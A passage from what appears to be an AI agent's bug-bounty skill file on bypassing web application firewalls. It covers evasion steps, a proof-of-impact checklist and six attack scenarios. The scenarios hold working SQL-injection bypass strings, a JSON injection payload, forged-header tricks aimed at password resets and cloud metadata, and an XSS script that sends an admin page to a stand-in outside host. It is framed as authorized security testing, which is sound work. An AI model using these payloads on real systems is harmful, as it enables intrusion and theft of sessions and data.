6. Mix multiple encoding techniques.
7. Exploit request parsing inconsistencies.
8. Use ML-generated payloads that evade signature detection.
9. Align TLS/JA3 with real browsers and switch to HTTP/3 where inspection is weaker.
10. Pivot to origin when feasible; fall back to stealth browser automation with humanization.

---

## Gate 0 Validation

Before writing any report, confirm all of the following — the "CONFIRM" step and "Do Not Speculate" rule from `hunt-skills/bountyforge/references/hacking-agents/waf-bypass-agent.md` are mandatory:

1. **What can the attacker do right now?** Show the payload reaching the backend: a SQL error message, a different response length, a timing delta, an OOB callback, or reflected data. A 200 status alone is not proof. If the WAF silently drops payloads, demonstrate the timing difference (`SLEEP(5)`) or an OOB hit.

2. **What does the victim lose?** Name the underlying primitive unlocked by the bypass — SQLi → data read; XSS → admin session/CSRF token/API key exfiltration; SSRF → internal/metadata access; upload → RCE. A bypass with no reachable impact is not a finding.

3. **Is the differential reproducible in 10 minutes from scratch?** Provide the blocked canonical payload and the working bypass side by side, with the identical baseline. A second person must be able to replay both and see the same status/length/timing difference.

4. **Have you isolated the exact rule?** State which token was blocked and which transformation defeated it. "The WAF is blocking SQLi" is speculation; "the WAF blocks `UNION SELECT` but `UNiON SeLeCt` passes, with three PoC requests" is evidence.

5. **Is the bypass still live?** Re-test the bypassing variant immediately before submission; vendors push rule changes frequently, and cookie/token rotation (Cloudflare's ~30-minute cookie rotation) can change results between attempts.

6. **Did you try at least three techniques?** If you are about to mark a path blocked, confirm you exhausted the "One More Try" list — or state which ones you tried and why the rest were not applicable.

7. **Is everything in scope?** Origin-direct pivots, desync/stress techniques, and automated fuzzing must stay within the authorized target and rules of engagement.

The source states the reporting bar as a direct contrast; reproduce it in your notes before submitting:

```
WRONG  "The WAF is blocking SQLi payloads, so this endpoint is probably protected."
RIGHT  "The WAF blocks 'UNION SELECT' but I confirmed 'UNiON SeLeCt' gets through —
        here are 3 PoC requests showing the difference."
```

A bypass that changes only the WAF's response but never changes the backend's behavior is a negative result, not a finding.

---

## Real Impact Examples

The two curated source skills contain no bug-bounty report IDs or report URLs. The scenarios below are therefore grounded strictly in the techniques and worked examples stated in those source skills and are cited by source path — no report identifiers are invented.

### Scenario A — SQLi unlocked behind a keyword filter (bountyforge source)

A request containing `test'+OR+1=1--` returns a block page. Fragmenting the payload shows the rule matches the literal `OR`. Case variation (`'Or+1=1--`) still blocks; comment insertion (`'/**/Or/**/1=1--`) passes with a different response length; adding a tab (`'%09Or%091=1--`) passes and produces a SQL error message. The source's own escalation sequence establishes backend reachability and hands the confirmed SQLi to `web-api-agent` for exploitation. Without the bypass the injectable parameter would have been dismissed as protected. (Source: `hunt-skills/bountyforge/references/hacking-agents/waf-bypass-agent.md`, worked escalation commands and "When to Escalate to Agent".)

### Scenario B — Stored XSS → admin dashboard exfiltration (bountyforge source)

The source gives the exact chain: a payload `<script>fetch('/admin').then(r=>r.text()).then(d=>new Image().src='//YOURDOMAIN.oastify.com/'+btoa(d))</script>` performs a same-origin fetch of the admin page (bypassing CORS), base64-encodes the HTML, and exfiltrates it via an image beacon that CSP `connect-src` does not restrict. The documented impact chain is stored XSS → admin session → exfiltrated admin dashboard → CSRF tokens, API keys, and user lists. Keyword filters against `alert`, `<script`, and `javascript:` are defeated by the Unicode escape, `.source`, `String.fromCharCode`, and multi-element assembly techniques in the same source. (Source: `hunt-skills/bountyforge/references/hacking-agents/waf-bypass-agent.md`, "Blind XSS with Admin Page Exfiltration" and "Advanced JS Context Bypass".)

### Scenario C — WAF removed entirely via origin discovery (offensive-skills source)

The 2024 research cited in the source skill found roughly 40% of Fortune-100 origins exposed via stale A records. Discovering such an origin through `securitytrails`, `bypass-firewalls-by-DNS-history`, Shodan/CloudFlair, or an `Alt-Svc` leak and replaying the blocked request directly at the origin with a forged `Host` header removes the WAF from the path. The source depicts this as a sequence diagram: normal route (blocked) → find origin IP → direct request with `Host` header → WAF bypassed. (Source: `offensive-skills/offensive-waf-bypass/SKILL.md`, "Call the Origin Server Directly".)

### Scenario D — Header spoofing cascading into multiple bugs (offensive-skills source)

The source enumerates the downstream impact of trusting forwarded headers behind a misconfigured reverse proxy: `X-Forwarded-Host: attacker.com` causes password-reset links to point at the attacker's domain (password-reset poisoning); `X-Forwarded-For: <trusted_ip>` bypasses IP-based access controls; host headers such as `X-Forwarded-Host` / `Referer` produce open redirects; and `X-Forwarded-For` / `X-Real-IP` can be aimed at internal IPs such as `169.254.169.254` for SSRF. One header-trust weakness therefore yields several distinct reportable outcomes. (Source: `offensive-skills/offensive-waf-bypass/SKILL.md`, "Request Header Manipulation".)

### Scenario E — JSON-based SQLi against multiple vendors (offensive-skills source)

The source cites CVE-2023-50969: many WAFs (AWS, Cloudflare, F5, Imperva) do not properly support JSON syntax in SQL, so a payload such as `{"id": {"$gt": "' OR 1=1--"}}` reaches the backend even when the equivalent flat syntax is filtered. This is a concrete instance of the broader principle that a parser gap between the WAF and the application is itself the bypass. (Source: `offensive-skills/offensive-waf-bypass/SKILL.md`, "SQL Injection Specific WAF Bypasses".)

### Scenario F — Desync delivering a payload the WAF never saw (bountyforge source)

In the request-smuggling example, the WAF inspects a first request containing only a terminating `0` chunk and considers it benign, while the backend reassembles the stream and processes a second request with `x=1%20OR%201=1`. The malicious payload never passes through the filter's inspection path. (Source: `hunt-skills/bountyforge/references/hacking-agents/waf-bypass-agent.md`, "HTTP Request Smuggling (WAF Bypass via Desync)".)

---

## Source Skill Lineage

This skill was distilled from exactly **2 curated source skills**, containing **94 unique sections** (each section appears in exactly one target). No bug-bounty reports were read during synthesis (`report_count: 0`, `full_reports_read: 0`). All `## SOURCE:` headers from the digest are listed below with each skill's unique contribution.

| # | Source path | Unique contribution |
|---|-------------|---------------------|
| 1 | `hunt-skills/bountyforge/references/hacking-agents/waf-bypass-agent.md` | Field methodology and hunter mindset — "WAF is a filter, not a wall", "If You See a Path, Walk It", "Do Not Speculate", the "One More Try" rule, and the DETECT → ISOLATE → BYPASS → CONFIRM → ESCALATE loop; WAF header signatures and status-code table (403/406/493, 200-empty drop, 302+captcha challenge); SQL case/comment/encoding exemplars; HPP, chunked transfer, and desync raw requests; XML/SVG/GraphQL/JSON representation swaps; the 13 advanced XSS-context obfuscation techniques (Unicode-escaped JS URI, autofocus+optional chaining, admin-page OOB exfil, Unicode escape chains, `String.fromCharCode`, JSFuck, regex `.source`, dynamic `import()`, `%0C`/`%09` whitespace, `location=` assembly, `contenteditable`+`onbeforeinput`, array indexing, double-URL-encoding); CSP-via-jQuery; IP/MIME obfuscation; payload isolation and timing confirmation; and the agent escalation handoff model. |
| 2 | `offensive-skills/offensive-waf-bypass/SKILL.md` | WAF taxonomy (negative vs positive models) and vendor fingerprinting (cookies, headers, `/cdn-cgi/`, JS objects, JA3/JA4, HTTP/2-3); network and browser-layer evasion (residential IPs, headless-browser fortification, scraping APIs, origin-direct via DNS history, WAF solvers, JS-challenge reverse engineering, CAPTCHA/Turnstile, honeypot avoidance, fingerprint defeat, TLS evasion, human-behavior simulation); per-class catalogs for SQLi (incl. CVE-2023-50969 JSON-based SQLi), XSS (mXSS, polyglots, CSP bypass), and GraphQL; HTTP protocol-level bypasses (method obfuscation, header spoofing, HPP, RFC inconsistencies, Host-header spoofing); advanced techniques (multiple `Content-Encoding`, 8k bypass, NFKD normalization, `Wafer` fuzzing, IP fragmentation, timing, ML/AI evasion); HTTP/2 `:authority`, HTTP/3 QUIC, Rapid Reset CVE-2023-44487, CONTINUATION flooding; SNI spoofing/omission/ECH and domain fronting; adversarial token injection and embedding-space manipulation; the full tool inventory (WAFW00F, IdentYwaf, GoTestWAF, FTW, graphql-cop, WAFNinja, WAFTester, libinjection-fuzzer, `bypass-firewalls-by-DNS-history`, `abuse-ssl-bypass-waf`, `noble-tls`/`uTLS`, etc.); and the ten-step WAF bypass chaining recipe. |

**Full archived corpus (all 94 sections, unabridged):** `E:\webt\skill-setup\skills-extract-from-reports\hunt-waf-bypass\references\source-knowledge.md`

Both source skills are reachable from GitHub: the first via the `hunt-skills/bountyforge` research-agent collection, the second from the `offensive-skills` set, whose own metadata points to `https://github.com/SnailSploit/offensive-checklist/blob/main/waf-bypass.md`. No other sources were used; no report IDs, bounties, or URLs have been fabricated.

---

## Related Skills & Chains

- **`hunt-sqli`** — the primary payload class behind the case/comment/encoding exemplars. Chain: WAF bypass delivers `UNiON SeLeCt` / JSON-based SQLi → `hunt-sqli` confirms and exploits the injection.
- **`hunt-xss`** — consumes the 13 XSS-context obfuscation techniques and the admin-page exfil chain. Chain: bypass keyword filters → stored/reflected XSS → admin session theft.
- **`hunt-ssrf`** — header spoofing and URL/IP obfuscation feed SSRF. Chain: `X-Forwarded-For`/`X-Real-IP` spoof or obfuscated internal URL → SSRF → cloud metadata. Apply that skill's OOB gate.
- **`hunt-request-smuggling`** — the desync and chunked-transfer patterns here are the WAF-layer entry to that skill's CL.TE/TE.CL/H2.CL analysis; effect must land on a different client's request.
- **`hunt-host-header`** — Host/`X-Forwarded-Host` spoofing, password-reset poisoning, and open redirects from the header-tricks section.
- **`hunt-graphql`** — alias spamming, batching, and query-name tampering when REST is filtered but GraphQL is not.
- **`hunt-upload`** — MIME confusion and double extensions that turn a filter bypass into RCE.
- **`hunt-api`** / **`hunt-file-reading`** — JSON/XML/GraphQL representation swaps and XXE-bearing SVG payloads.
- **`hunt-cors`** / **`hunt-open-redirect`** — downstream outcomes of forwarded-header and origin-direct bypasses.

**Escalation handoff (from the bountyforge source):** once a bypass succeeds, SQLi / XSS / file-upload confirmations go to `web-api-agent` for exploitation or chain building; SSRF confirmations go to `recon-agent` for infrastructure pivoting. The bypass agent returns the technique that worked, the confirmed payload variants, and evidence that the payload reached the backend.

**In summary:** a WAF is a filter with edge cases, not an impenetrable wall. Identify the vendor, isolate the exact blocked token, try at least three transformations, move across representation and protocol layers when needed, and never claim a bypass without backend proof — then hand the confirmed primitive to the right exploitation skill.

Full unabridged source knowledge for this skill is archived at `E:\webt\skill-setup\skills-extract-from-reports\hunt-waf-bypass\references\source-knowledge.md` (94 sections from the 2 source skills listed above).
